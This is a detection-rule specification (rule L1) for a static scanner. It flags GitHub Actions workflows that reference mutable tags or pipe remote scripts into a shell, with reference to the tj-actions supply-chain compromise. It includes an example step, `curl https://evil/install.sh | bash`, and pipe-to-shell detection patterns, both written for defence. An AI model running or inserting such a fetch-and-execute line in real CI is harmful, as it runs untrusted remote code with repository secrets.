---
rule_id: L1
interface_version: v2
severity: critical

threat_refs:
  - kind: cve
    id: CVE-2025-30066
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-30066
  - kind: paper
    id: Wiz-tj-actions-2025
    url: https://www.wiz.io/blog/tj-actions-changed-files-supply-chain-attack-cve-2025-30066
    summary: >
      Wiz Research disclosure of the tj-actions/changed-files compromise of
      March 2025. Attacker force-pushed a malicious commit to the v35 tag
      referenced by ~23,000 downstream workflows. Every CI run using the
      mutable tag executed the implant and exfiltrated GITHUB_TOKEN, npm
      tokens, and AWS credentials from the runner environment.
  - kind: paper
    id: StepSecurity-harden-runner
    url: https://www.stepsecurity.io/blog/pinning-github-actions-for-enhanced-security
    summary: >
      StepSecurity Harden-Runner guidance: only full 40-character commit
      SHAs block force-push tag poisoning. Version tags v1, v5, main, master
      are mutable and can be re-pointed at malicious commits after the
      workflow has been reviewed.

lethal_edge_cases:
  - >
    Pinned-SHA overridden at workflow_run — a workflow initially pinned its
    dependency to a 40-char SHA but a later commit replaced the SHA with
    `@v5` because "the SHA is too ugly". The pattern a static check must
    catch: the parsed `uses:` value fails the 40-lowercase-hex test. Never
    trust the commit message or comment above the line.
  - >
    Matrix-expanded version — `strategy.matrix.action-version: [v1, v5]` +
    `uses: owner/action@${{ matrix.action-version }}`. The template literal
    renders a mutable tag at runtime. A rule that only looks at `uses`
    string literals after parsing misses this; the rule must also flag
    `${{` expression interpolation in the ref segment.
  - >
    Reusable workflow nesting — `uses: owner/repo/.github/workflows/ci.yml@main`.
    Reusable workflows can themselves pin to mutable tags in their own
    `uses:` statements. A scan that only walks the top-level workflow
    misses downstream tag-poisoning inside the referenced reusable.
    The rule flags any `@<mutable-tag>` in ANY `.github/workflows/*.yml`
    file available in source_files, including files nested inside the
    workflow path.
  - >
    Post-release tag rewrite — upstream repo publishes owner/action@v5
    pointing at SHA A, then force-pushes the tag to SHA B containing a
    backdoor. The poisoned SHA was never part of the reviewed release.
    The rule has no way to observe the attack live, but flagging every
    non-SHA `uses:` ref reduces the attack surface to zero.
  - >
    Pipe-to-shell inside `run:` — `run: curl https://evil/install.sh | bash`.
    Same threat class as CVE-2025-30066 but surfaces via the step's `run`
    rather than `uses`. Rule walks every `run:` step and classifies the
    body for pipe-to-shell and wget-to-shell patterns in addition to
    `uses:` tag pinning.

edge_case_strategies:
  - structured-yaml-walk
  - expression-interpolation-detection
  - nested-reusable-workflow-scan
  - sha-pin-verification
  - run-step-pipe-to-shell

evidence_contract:
  minimum_chain:
    source: true
    propagation: false
    sink: true
    mitigation: true
    impact: true
  required_factors:
    - mutable_tag_reference
    - unpinned_third_party_action
    - pipe_to_shell_in_run
  location_kinds:
    - config
    - source

obsolescence:
  retire_when: >
    GitHub enforces immutable Action tags at the registry level
    (signed release artefacts, tag-protection by default) — OR the
    ecosystem migrates to OCI-signed GitHub Actions with mandatory
    sigstore-style attestation, making tag force-push forgeable-only by
    the signing key holder.
---

# L1 — GitHub Actions Tag Poisoning

**Author:** Senior MCP Threat Researcher persona.
**Applies to:** MCP server repositories whose CI/CD is defined in
`.github/workflows/*.yml` (or any file whose body parses as a GitHub
Actions workflow).

## What an auditor accepts as evidence

A supply-chain auditor (ISO 27001 A.5.21 supplier relationships, CoSAI
MCP-T6 supply-chain integrity, EU AI Act Art. 9 risk management) will not
accept "workflow file mentions @v5". They will accept:

1. **Parse proof** — the finding must cite a `config`-kind Location whose
   `json_pointer` points at the exact `uses:` or `run:` key in the
   structured workflow document (e.g., `/jobs/publish/steps/2/uses`).
   Not "line 42 of ci.yml".

2. **Ref classification** — the rule must produce a factor naming the
   family that matched: `mutable_tag_reference` for `@v5` / `@main`,
   `expression_interpolated_ref` for `@${{ matrix.x }}`, `missing_sha_pin`
   for a ref that is neither 40-hex nor a known-safe first-party Action.

3. **Mitigation check** — does the enclosing workflow use a Harden-Runner
   step, a Pinact pre-commit guard, or Dependabot with
   `commit-message: pin-dependencies`? These mitigations exist in real
   MCP repos and must be reflected in the finding, not ignored.

4. **Impact statement** — the scenario is concrete: the forked workflow
   runs on push to main, has access to secrets inherited from the
   repository (npm publish token, DATABASE_URL, ANTHROPIC_API_KEY),
   and any tag-poisoning commit executes with those privileges.

## What the rule does NOT claim

- It does not claim that all `@v5` references are malicious today. It
  claims that every `@v5` is a REACHABLE surface for tag poisoning, which
  is the class of finding the EU AI Act Art. 9 risk-management
  obligation requires to be recorded.
- It does not audit the upstream Action's own security posture. A
  SHA-pinned reference to a malicious Action is still a compromise; that
  is a different rule (K10 package registry substitution).

## Why confidence is capped at 0.90

Two scenarios keep us from 1.0:
- The workflow file may never actually run (stale repository with
  deleted workflow files present); the static analyser cannot observe
  `on:` trigger reachability.
- Enterprise repos may have GitHub tag-protection enabled, which
  restricts force-push on tags. A static scanner cannot observe the
  server-side config.
